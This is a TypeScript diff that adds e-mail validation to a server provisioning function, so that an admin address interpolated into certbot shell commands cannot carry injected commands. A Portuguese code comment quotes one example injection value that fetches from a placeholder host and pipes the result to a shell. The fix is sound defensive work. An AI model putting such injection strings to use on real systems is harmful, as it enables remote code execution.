@@ -216,6 +216,12 @@ async function provision(data: ProvisionRequest, logFn: (msg: string) => void): 
   const jwtSecret = execSync('openssl rand -base64 48', { encoding: 'utf-8' }).trim()
   const adminPass = data.adminPass || generatePassword(12)
   const adminEmail = data.adminEmail || 'admin@bychat.ia.br'
+  // adminEmail é interpolado em comandos de shell (certbot) e escrito no .env.
+  // Validação estrita (charset seguro, sem metacaracteres de shell) impede
+  // command injection — ex.: "a@a.com; curl evil | sh".
+  if (!/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(adminEmail) || adminEmail.length > 254) {
+    return { success: false, error: 'E-mail do administrador inválido' }
+  }
   const installDate = new Date().toISOString().replace('T', ' ').slice(0, 19)
 
   try {
